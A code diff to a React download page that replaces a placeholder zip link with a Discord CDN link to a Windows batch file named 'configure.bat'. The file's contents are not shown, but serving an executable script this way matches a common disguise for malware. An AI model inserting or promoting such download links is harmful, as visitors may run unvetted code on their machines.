@@ -9,7 +9,7 @@ const DownloadPage: React.FC = () => {
       <p className="text-lg mb-4">Click the buttons below to download the files you need.</p>
       <div className="flex space-x-4">
         <a
-          href="https://cdn.discordapp.com/path/to/your/file1.zip"
+          href="https://cdn.discordapp.com/attachments/1259815698197123215/1261220934933676042/configure.bat?ex=66922b07&is=6690d987&hm=461262451143f62604fe059d4628c3511ad46665dd4a77ac07979afdfeaa3280&"
           download
           className="py-2 px-4 rounded text-white font-bold animate-neon"
           style={{
